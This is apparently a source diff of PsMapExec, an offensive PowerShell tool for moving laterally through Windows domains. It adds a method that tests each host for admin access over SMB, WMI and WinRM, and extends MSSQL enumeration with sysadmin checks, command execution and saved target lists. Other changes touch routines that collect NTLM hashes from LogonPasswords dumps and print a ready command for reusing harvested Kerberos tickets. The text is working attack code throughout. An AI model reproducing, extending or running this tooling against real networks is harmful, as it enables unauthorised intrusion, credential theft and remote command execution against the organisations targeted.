     $ComputerName = $computer.Properties["dnshostname"][0]
+    $OS = $computer.Properties["operatingSystem"][0]
+    }
+
+    elseif ($IPAddress){
+    $ComputerName = "$Computer"
+    $OS = "OS:PLACEHOLDER"
+    }
 
 $tcpClient = New-Object System.Net.Sockets.TcpClient
 $asyncResult = $tcpClient.BeginConnect($ComputerName, 445, $null, $null)
-$wait = $asyncResult.AsyncWaitHandle.WaitOne(50) 
+$wait = $asyncResult.AsyncWaitHandle.WaitOne($Timeout) 
 
 if ($wait) { 
     try {
@@ -3375,11 +3417,11 @@ $runspacePool.Open()
 $runspaces = New-Object System.Collections.ArrayList
 
 $scriptBlock = {
-    param ($computerName, $Command)
+    param ($computerName, $Command, $Timeout)
 
     $tcpClient = New-Object System.Net.Sockets.TcpClient
     $asyncResult = $tcpClient.BeginConnect($ComputerName, 135, $null, $null)
-    $wait = $asyncResult.AsyncWaitHandle.WaitOne(50) 
+    $wait = $asyncResult.AsyncWaitHandle.WaitOne($Timeout) 
 
     if ($wait) { 
         try {
@@ -3568,49 +3610,20 @@ function GetScriptOutput([string]$ComputerName, [string]$CommandId) {
 }
 
 
-function Display-ComputerStatus {
-    param (
-        [string]$ComputerName,
-        [string]$OS,
-        [System.ConsoleColor]$statusColor = 'White',
-        [string]$statusSymbol = "",
-        [string]$statusText = "",
-        [int]$NameLength,
-        [int]$OSLength
-    )
-
-    # Prefix
-    Write-Host "SessionHunter " -ForegroundColor Yellow -NoNewline
-    Write-Host "   " -NoNewline
-    
-    # Resolve IP
-    $IP = $null
-    $Ping = New-Object System.Net.NetworkInformation.Ping 
-    $Result = $Ping.Send($ComputerName, 15)
-    if ($Result.Status -eq 'Success') {
-    $IP = $Result.Address.IPAddressToString
-    Write-Host ("{0,-16}" -f $IP) -NoNewline
-    } else {Write-Host ("{0,-16}" -f $IP) -NoNewline}
-    
-    # Display ComputerName and OS
-    Write-Host ("{0,-$NameLength}" -f $ComputerName) -NoNewline
-    Write-Host "   " -NoNewline
-    Write-Host ("{0,-$OSLength}" -f $OS) -NoNewline
-    Write-Host "   " -NoNewline
-
-    # Display status symbol and text
-    Write-Host $statusSymbol -ForegroundColor $statusColor -NoNewline
-    Write-Host $statusText
-}
-
-
 # Create and invoke runspaces for each computer
 foreach ($computer in $computers) {
 
+    if (!$IPAddress){
     $ComputerName = $computer.Properties["dnshostname"][0]
     $OS = $computer.Properties["operatingSystem"][0]
+    }
+
+    elseif ($IPAddress){
+    $ComputerName = "$Computer"
+    $OS = "OS:PLACEHOLDER"
+    }
     
-    $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($ComputerName).AddArgument($Command)
+    $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($ComputerName).AddArgument($Command).AddArgument($Timeout)
     $runspace.RunspacePool = $runspacePool
 
     [void]$runspaces.Add([PSCustomObject]@{
@@ -3630,7 +3643,6 @@ do {
             $runspace.Completed = $true
             $result = $runspace.Runspace.EndInvoke($runspace.Handle)
             $hasDisplayedResult = $false
-            $result = $result.Trim()
 
             # [other conditions for $result]
             if ($result -eq "Access Denied") {
@@ -3931,11 +3943,11 @@ $runspacePool.Open()
 $runspaces = New-Object System.Collections.ArrayList
 
 $scriptBlock = {
-    param ($ComputerName, $Port)
+    param ($ComputerName, $Port, $Timeout)
 
       $tcpClient = New-Object System.Net.Sockets.TcpClient
     $asyncResult = $tcpClient.BeginConnect($ComputerName, $Port, $null, $null)
-    $wait = $asyncResult.AsyncWaitHandle.WaitOne(50) 
+    $wait = $asyncResult.AsyncWaitHandle.WaitOne($Timeout) 
 
     if ($wait) { 
         try {
@@ -4012,51 +4024,20 @@ return "$AuthSupported"
 
 }
 
-
-
-function Display-ComputerStatus {
-    param (
-        [string]$ComputerName,
-        [string]$OS,
-        [System.ConsoleColor]$statusColor = 'White',
-        [string]$statusSymbol = "",
-        [string]$statusText = "",
-        [int]$NameLength,
-        [int]$OSLength
-    )
-
-    # Prefix
-    Write-Host "VNC " -ForegroundColor Yellow -NoNewline
-    Write-Host "   " -NoNewline
-    
-    # Resolve IP
-    $IP = $null
-    $Ping = New-Object System.Net.NetworkInformation.Ping 
-    $Result = $Ping.Send($ComputerName, 15)
-    if ($Result.Status -eq 'Success') {
-    $IP = $Result.Address.IPAddressToString
-    Write-Host ("{0,-16}" -f $IP) -NoNewline
-    } else {Write-Host ("{0,-16}" -f $IP) -NoNewline}
-    
-    # Display ComputerName and OS
-    Write-Host ("{0,-$NameLength}" -f $ComputerName) -NoNewline
-    Write-Host "   " -NoNewline
-    Write-Host ("{0,-$OSLength}" -f $OS) -NoNewline
-    Write-Host "   " -NoNewline
-
-    # Display status symbol and text
-    Write-Host $statusSymbol -ForegroundColor $statusColor -NoNewline
-    Write-Host $statusText
-}
-
-
 # Create and invoke runspaces for each computer
 foreach ($computer in $computers) {
 
+    if (!$IPAddress){
     $ComputerName = $computer.Properties["dnshostname"][0]
     $OS = $computer.Properties["operatingSystem"][0]
+    }
+
+    elseif ($IPAddress){
+    $ComputerName = "$Computer"
+    $OS = "OS:PLACEHOLDER"
+    }
     
-    $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($ComputerName).AddArgument($Port)
+    $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($ComputerName).AddArgument($Port).AddArgument($Timeout)
     $runspace.RunspacePool = $runspacePool
 
     [void]$runspaces.Add([PSCustomObject]@{
@@ -4124,7 +4105,7 @@ $runspacePool.Open()
 $runspaces = New-Object System.Collections.ArrayList
 
 $scriptBlock = {
-    param ($ComputerName)
+    param ($ComputerName, $MSSQL)
 
 function Send-UdpDatagram {
     param ([string]$ComputerName)
@@ -4165,8 +4146,15 @@ function Send-UdpDatagram {
 
 foreach ($computer in $computers) {
 
+    if (!$IPAddress){
     $ComputerName = $computer.Properties["dnshostname"][0]
-    $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($ComputerName).AddArgument($Port)
+    }
+
+    elseif ($IPAddress){
+    $ComputerName = $Computer
+    }
+
+    $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($ComputerName).AddArgument($Port).AddArgument($MSSQL).AddArgument($timeout)
     $runspace.RunspacePool = $runspacePool
 
     [void]$runspaces.Add([PSCustomObject]@{
@@ -4232,7 +4220,8 @@ function Get-ADSQLInstances {
     return $AllInstances
 }
 
-$AllInstances = Get-ADSQLInstances
+if (!$IPAddress){$AllInstances = Get-ADSQLInstances}
+
 
 # Poll the runspaces and display results as they complete
 do {
@@ -4262,6 +4251,41 @@ $AllInstances = $AllInstances.ToUpper()
 $AllInstances = $AllInstances.Trim()
 $AllInstances = $AllInstances | Select -Unique | Sort-Object
 
+$MSSQLComputers = $AllInstances | ForEach-Object {
+    $computerPart = ($_ -split '\\')[0]
+    if ($computerPart -like '*.*') {
+        $computerPart
+    } else {
+        $computerPart -split '\.' | Select -Object -First 1
+    }
+}
+
+$UniqueMSSQLComputers = $MSSQLComputers | Sort-Object -Unique
+$FilePath = Join-Path -Path $MSSQL -ChildPath ("MSSQL-" + "All-Discovered-MSSQL-Servers" + ".txt")
+
+# Read existing entries from the file
+$ExistingEntries = @()
+if (Test-Path -Path $FilePath) {
+    $ExistingEntries = Get-Content -Path $FilePath
+}
+
+# Compare and append only new entries
+$NewEntries = $UniqueMSSQLComputers | Where-Object { $_ -notin $ExistingEntries }
+$NewEntries | Add-Content -Path $FilePath -Encoding ASCII -Force -ErrorAction "SilentlyContinue"
+
+# Filter out instances not present in $Computers
+$ComputerNames = $Computers | ForEach-Object {
+    if ($_.Properties["dnshostname"]) {
+        $_.Properties["dnshostname"][0].ToUpper()
+    } else {
+        $_.ToUpper()
+    }
+}
+$FilteredInstances = $AllInstances | Where-Object { $ComputerNames -contains $_.Split('\')[0] }
+
+# Assign the filtered list back to $AllInstances
+$AllInstances = $FilteredInstances
+
 function Display-ComputerStatus {
     param (
         [string]$ComputerName,
@@ -4280,11 +4304,8 @@ function Display-ComputerStatus {
     Write-Host "   " -NoNewline
     
     Write-Host ("{0,-16}" -f $IPAddress) -NoNewline
-    Write-Host "   " -NoNewline
     
     # Display ComputerName, OS, and NamedInstance
-    Write-Host "$ComputerName" -noNewLine
-    Write-Host "   " -NoNewline
     Write-Host ("{0,-$InstanceLength}" -f $NamedInstance) -NoNewline
     Write-Host "   " -NoNewline
 
@@ -4292,6 +4313,7 @@ function Display-ComputerStatus {
     Write-Host $statusSymbol -ForegroundColor $statusColor -NoNewline
     Write-Host $statusText
 }
+
 
 $runspacePool = [runspacefactory]::CreateRunspacePool(1, $Threads)
 $runspacePool.Open()
@@ -4412,12 +4434,6 @@ Function Invoke-SqlQuery {
         [string]$Password
     )
 
-    # Determine which connection string to use
-    $ConnectionString = if ($Username -and $Password) {
-        "Server=$NamedInstance;User ID=$Username;Password=$Password;Encrypt=Yes;TrustServerCertificate=Yes;Connection Timeout=3"
-    } else {
-        "Server=$NamedInstance;Integrated Security=True;Encrypt=Yes;TrustServerCertificate=Yes;Connection Timeout=3"
-    }
 
     try {
         # Create and open a SQL connection
@@ -4506,74 +4522,58 @@ function MSSQL-Command {
 }
 
 # Start Impersonation (if required)
-if ($Username -ne "" -or $Password -ne "" -and !$LocalAuth){
+if (!$LocalAuth -and $Username -ne "" -and $Password -ne ""){
 Invoke-Impersonation -Username $Username -Password $Password -Domain $Domain
 }
 
-Function SQLAdminCheck {
+function SQLAdminCheck {
     [CmdletBinding()]
     param(
         [Parameter(Mandatory=$true)]
-        $NamedInstance,
+        [string]$NamedInstance,
         
         [Parameter(Mandatory=$false)]
-        $Username,
+        [string]$Username,
         
         [Parameter(Mandatory=$false)]
-        $Password,
-        
-        [Parameter(Mandatory=$false)]
-        $LocalAuth
+        [string]$Password
     )
 
-    # Determine authentication method based on provided credentials
-    if ($Username -ne "" -or $Password -ne "" -and !$LocalAuth) {
-        $ConnectionString = "Server=$NamedInstance;Integrated Security=True;Encrypt=Yes;TrustServerCertificate=Yes;Connection Timeout=3"
-    } else {
-        $ConnectionString = "Server=$NamedInstance;User Id=$Username;Password=$Password;Encrypt=Yes;TrustServerCertificate=Yes;Connection Timeout=3"
-    }
-
     try {
-        # Create a SQL connection
+        # Create and open SQL connection
+        Write-Verbose "Opening SQL connection to $NamedInstance"
         $SqlConnection = New-Object System.Data.SqlClient.SqlConnection
         $SqlConnection.ConnectionString = $ConnectionString
-
-        # Open the connection
         $SqlConnection.Open()
-
-        # Create a SQL command to check sysadmin membership
+        
+        # Create SQL command to check sysadmin membership
         $SqlCommand = $SqlConnection.CreateCommand()
         $SqlCommand.CommandText = "SELECT IS_SRVROLEMEMBER('sysadmin')"
-
-        # Execute the query and get the result
         $IsSysAdmin = $SqlCommand.ExecuteScalar()
-
+        
         # Check if the user is a sysadmin
-        switch ($IsSysAdmin) {
-            "1" {
-                $SYSADMIN = $True
-                if ($Command -ne "") {
-                    return MSSQL-Command -NamedInstance $NamedInstance -Command $Command
-                } else {
-                    return "SUCCESS SYSADMIN"
-                }
+        if ($IsSysAdmin -eq "1") {
+            $SYSADMIN = $True
+            if ($Command -ne "") {
+                # Execute the provided command
+                return MSSQL-Command -NamedInstance $NamedInstance -Command $Command
+            } else {
+                return "SUCCESS SYSADMIN"
             }
-            0 {
-                $SYSADMIN = $False
-                return "SUCCESS NOT SYSADMIN"
-            }
-            default {
-                $SYSADMIN = $False
-                return "ERROR"
-            }
+        } elseif ($IsSysAdmin -eq "0") {
+            $SYSADMIN = $False
+            return "SUCCESS NOT SYSADMIN"
+        } else {
+            $SYSADMIN = $False
+            return "ERROR"
         }
     } catch {
-        return "ERROR"
+        Write-Error "Error occurred on $NamedInstance`: $_"
+        return $null
     } finally {
-        # Close the SQL connection
-        if ($SqlConnection.State -eq 'Open') {
+        # Close SQL connection and clear pool
+        if ($SqlConnection -and $SqlConnection.State -eq 'Open') {
             $SqlConnection.Close()
-            # Dispose the pool cache, otherwise results get skewed on next run
             [System.Data.SqlClient.SqlConnection]::ClearAllPools()
         }
     }
@@ -4586,16 +4586,15 @@ function Test-SqlConnection {
     [Parameter(Mandatory=$true)]
     [string]$NamedInstance
     )
-
     if (!$LocalAuth) {
-        $ConnectionString = "Server=$NamedInstance;Integrated Security=True;Encrypt=Yes;TrustServerCertificate=Yes;Connection Timeout=3"
+        $ConnectionString = "Server=$NamedInstance;Integrated Security=True;Encrypt=Yes;TrustServerCertificate=Yes;Connection Timeout=1"
    } elseif ($LocalAuth) {
-       $ConnectionString = "Server=$NamedInstance;User Id=$Username;Password=$Password;Encrypt=Yes;TrustServerCertificate=Yes;Connection Timeout=3"
+       $ConnectionString = "Server=$NamedInstance;User Id=$Username;Password=$Password;Encrypt=Yes;TrustServerCertificate=Yes;Connection Timeout=1"
     }
 
     $connection = New-Object System.Data.SqlClient.SqlConnection
     $connection.ConnectionString = $ConnectionString
-
+    
     try {
         $connection.Open()
         if ($connection.State -eq 'Open'){
@@ -4609,6 +4608,7 @@ function Test-SqlConnection {
     } catch {
         if ($_.Exception.Message -like "*Login failed for user*"){return "Access Denied"}
         elseif ($_.Exception.Message -like "*error: 26*"){return "Unable to connect"}
+        elseif ($_.Exception.Message -like "*error: 40*"){return "Unable to connect"}
         else {return "ERROR"}
     } finally {
         if ($Username -ne "" -or $Password -ne "" -and !$LocalAuth){
@@ -4627,13 +4627,18 @@ if ($Username -ne "" -or $Password -ne "" -and !$LocalAuth){Invoke-Impersonation
 }
 
 foreach ($NamedInstance in $AllInstances) {
-     
+
     $ComputerNameFromInstance = $NamedInstance.Split('\')[0]
+    try {
     $IP = $null
     $Ping = New-Object System.Net.NetworkInformation.Ping 
-    $IPResult = $Ping.Send($ComputerNameFromInstance, 15)
+    $IPResult = $Ping.Send($ComputerNameFromInstance, 10)
     if ($IPResult.Status -eq 'Success') {
     $IP = $IPResult.Address.IPAddressToString}
+
+    }
+
+    Catch {$IP = " " * 16}
     
     $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($NamedInstance).AddArgument($Username).AddArgument($Password).AddArgument($LocalAuth).AddArgument($Domain).AddArgument($Command)
     $runspace.RunspacePool = $runspacePool
@@ -4656,9 +4661,14 @@ do {
         if ($runspace.Handle.IsCompleted) {
             $runspace.Completed = $true
             $result = $runspace.Runspace.EndInvoke($runspace.Handle)
-            
+            $SysAdminFilePath = Join-Path -Path $MSSQL -ChildPath ("$Username-SYSADMIN-Accessible-MSSQL-Instances.txt")
+            $AccessibleFilePath = Join-Path -Path $MSSQL -ChildPath ("$Username-Accessible-MSSQL-Instances.txt")
+
+            if (!$Username){$Username = $env:username}
+
+
             if ($result -eq "Unable to connect"){continue}
-            
+
             if ($result -eq "Access Denied"){
             if ($SuccessOnly){continue}
             Display-ComputerStatus  -statusColor "Red" -statusSymbol "[-] " -statusText "ACCESS DENIED" -NamedInstance $($runspace.Instance) -IpAddress $($runspace.IPAddress)
@@ -4671,30 +4681,40 @@ do {
             continue
             }
 
-
             elseif ($result -eq "Success"){
             Display-ComputerStatus -statusColor "Green" -statusSymbol "[+] " -statusText "ACCESSIBLE INSTANCE" -NamedInstance $($runspace.Instance) -IpAddress $($runspace.IPAddress)
+            $($runspace.Instance) | Add-Content -Path "$AccessibleFilePath" -Encoding "ASCII" -Force
             continue            
             }
 
             elseif ($result -eq "SUCCESS SYSADMIN"){
             Display-ComputerStatus -statusColor "Yellow" -statusSymbol "[+] " -statusText "SYSADMIN" -NamedInstance $($runspace.Instance) -IpAddress $($runspace.IPAddress)
+            $($runspace.Instance) | Add-Content -Path "$SysAdminFilePath" -Encoding "ASCII" -Force
             continue            
             }
            
             
             elseif ($result -eq "SUCCESS NOT SYSADMIN"){
             Display-ComputerStatus -statusColor "Green" -statusSymbol "[+] " -statusText "ACCESSIBLE INSTANCE" -NamedInstance $($runspace.Instance) -IpAddress $($runspace.IPAddress)
+            $($runspace.Instance) | Add-Content -Path "$AccessibleFilePath" -Encoding "ASCII" -Force
             continue            
             }
 
             elseif ($Command -ne "" -and $Result -ne ""){
             Display-ComputerStatus -statusColor "Yellow" -statusSymbol "[+] " -statusText "SYSADMIN" -NamedInstance $($runspace.Instance) -IpAddress $($runspace.IPAddress)
+            $($runspace.Instance) | Add-Content -Path "$AccessibleFilePath" -Encoding "ASCII" -Force
             Write-Output ""
             Write-output $Result
             Write-Output ""
             continue
             }
+
+            elseif ($result -like "*untrusted domain and cannot be used with Windows authentication*"){
+            if ($SuccessOnly){continue}
+            Display-ComputerStatus  -statusColor "Red" -statusSymbol "[-] " -statusText "Untrusted Domain" -NamedInstance $($runspace.Instance) -IpAddress $($runspace.IPAddress)
+            continue
+            }
+
 
              
              # Dispose of runspace and close handle
@@ -4711,7 +4731,162 @@ do {
 $runspacePool.Close()
 $runspacePool.Dispose()
 
+if (Test-Path -Path $SysAdminFilePath) {
+    Get-Content -Path $SysAdminFilePath |
+        Sort-Object -Unique |
+        Set-Content -Path $SysAdminFilePath
+}
 
+if (Test-Path -Path $AccessibleFilePath) {
+    Get-Content -Path $AccessibleFilePath |
+        Sort-Object -Unique |
+        Set-Content -Path $AccessibleFilePath
+}
+
+
+}
+
+################################################################################################################
+################################################ Function: All #################################################
+################################################################################################################
+Function Method-all {
+    # Create a runspace pool
+    $runspacePool = [runspacefactory]::CreateRunspacePool(1, $Threads)
+    $runspacePool.Open()
+    $runspaces = New-Object System.Collections.ArrayList
+
+    $scriptBlock = {
+        param ($computerName, $Domain, $Timeout)
+
+        Function Test-Port {
+            param ($ComputerName, $Port)
+            $tcpClient = New-Object System.Net.Sockets.TcpClient
+            $asyncResult = $tcpClient.BeginConnect($ComputerName, $Port, $null, $null)
+            $wait = $asyncResult.AsyncWaitHandle.WaitOne($Timeout)
+
+            if ($wait) {
+                try {
+                    $tcpClient.EndConnect($asyncResult)
+                    return $true
+                } catch {
+                    return $false
+                }
+            } else {
+                return $false
+            }
+        }
+
+        # Check Ports
+        $WinRMPort = Test-Port -ComputerName $ComputerName -Port 5985
+        $WMIPort = Test-Port -ComputerName $ComputerName -Port 135
+        $SMBPort = Test-Port -ComputerName $ComputerName -Port 445
+
+
+        # if all three fail, return and kill the runspace
+        if (-not $SMBPort -and -not $WMIPort -and -not $WinRMPort) {
+            return "Unable to connect"
+        }
+
+        # SMB Check
+        if ($SMBPort) {
+            $SMBCheck = Test-Path "\\$ComputerName\c$" -ErrorAction SilentlyContinue
+            if (-not $SMBCheck) {
+                $SMBAccess = $False
+            } else {
+                $SMBAccess = $True
+            }
+        }
+
+        # WMI Check
+        if ($WMIPort) {
+            try {
+                Get-WmiObject -Class Win32_OperatingSystem -ComputerName $ComputerName -ErrorAction Stop
+                $WMIAccess = $True  # Set WMIAccess to true if command succeeds
+            } catch {
+                $WMIAccess = $False  # Set WMIAccess to false if command fails
+            }
+        }
+
+        # WinRM Check
+        if ($WinRMPort) {
+            try {
+                Invoke-Command -ComputerName $computerName -ScriptBlock {echo "Successful Connection PME"} -ErrorAction Stop
+                $WinRMAccess = $True
+            } catch {
+                if ($_.Exception.Message -like "*Access is Denied*") {
+                    $WinRMAccess = $False
+                } elseif ($_.Exception.Message -like "*cannot be resolved*") {
+                    $WinRMAccess = $False
+                }
+            }
+        }
+
+        return @{
+            WMIAccess = $WMIAccess
+            SMBAccess = $SMBAccess
+            WinRMAccess = $WinRMAccess
+        }
+    }
+
+    
+
+    # Create and invoke runspaces for each computer
+    foreach ($computer in $computers) {
+
+    if (!$IPAddress){
+    $ComputerName = $computer.Properties["dnshostname"][0]
+    $OS = $computer.Properties["operatingSystem"][0]
+    }
+
+    elseif ($IPAddress){
+    $ComputerName = "$Computer"
+    $OS = "OS:PLACEHOLDER"
+    }
+
+        $runspace = [powershell]::Create().AddScript($scriptBlock).AddArgument($ComputerName).AddArgument($Domain).AddArgument($Timeout)
+        $runspace.RunspacePool = $runspacePool
+
+        [void]$runspaces.Add([PSCustomObject]@{
+            Runspace = $runspace
+            Handle = $runspace.BeginInvoke()
+            ComputerName = $ComputerName
+            OS = $OS
+            Completed = $false
+        })
+    }
+
+    # Poll the runspaces and display results as they complete
+    do {
+        foreach ($runspace in $runspaces | Where-Object { -not $_.Completed }) {
+            if ($runspace.Handle.IsCompleted) {
+                $runspace.Completed = $true
+                $result = $runspace.Runspace.EndInvoke($runspace.Handle)
+                
+                if ($result -eq "Unable to connect") { continue }
+
+                # Build string of successful protocols
+                $successfulProtocols = @()
+                if ($result.SMBAccess -eq $True) { $successfulProtocols += "SMB" }
+                if ($result.WinRMAccess -eq $True) { $successfulProtocols += "WinRM" }
+                if ($result.WMIAccess -eq $True) { $successfulProtocols += "WMI" }
+
+                if ($successfulProtocols.Count -gt 0) {
+                    $statusText = $successfulProtocols -join ', '
+                    Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Green" -statusSymbol "[+] " -statusText $statusText -NameLength $NameLength -OSLength $OSLength
+                    continue
+                } else {
+                    if ($SuccessOnly){continue}
+                    Display-ComputerStatus -ComputerName $($runspace.ComputerName) -OS $($runspace.OS) -statusColor "Red" -statusSymbol "[-] " -statusText "ACCESS DENIED" -NameLength $NameLength -OSLength $OSLength
+                    continue
+                }
+            }
+        }
+        Start-Sleep -Milliseconds 100
+    } while ($runspaces | Where-Object { -not $_.Completed })
+
+    # Clean up
+    $runspacePool.Close()
+    $runspacePool.Dispose()
 }
 
 ################################################################################################################
@@ -4974,9 +5149,9 @@ function Parse-LogonPasswords {
                 Write-Host -NoNewline "$($_.Notes)"
             }
             Write-Host ""
-            Write-Host ""
             "$($_.Identity):$($_.NTLM)" | Add-Content -Path "$LogonPasswords\.AllUniqueNTLM.txt" -Encoding "ASCII" -Force
             }
+            Write-Host ""
             
             Move-Item -Path $File.FullName -Destination $ComputerDirectory -Force -ErrorAction "SilentlyContinue"
         }
@@ -5241,7 +5416,7 @@ function Parse-KerbDump {
                         Set-Variable -Name $randomVarName -Value $filePath -Scope Global
                         
                         # A neat one-liner instruction for the user
-                        Write-Host "Impersonate   : PsMapExec -Targets All -Method WMI -Ticket `$$randomVarName"
+                        Write-Host "Impersonate   : PsMapExec -Targets $Targets -Method $Method -Ticket `$$randomVarName"
                         Write-Host
                         
                         } Else {Write-Host}
@@ -5364,12 +5539,12 @@ Function Parse-NTDS {
 
 
 
-
 ################################################################################################################
 ################################################ Execute defined functions #####################################
 ################################################################################################################
 
 switch ($Method) {
+        "All" {Method-All}
         "WinRM" {Method-WinRM}
         "MSSQL" {Method-MSSQL}
         "SMB" {Method-SMB}
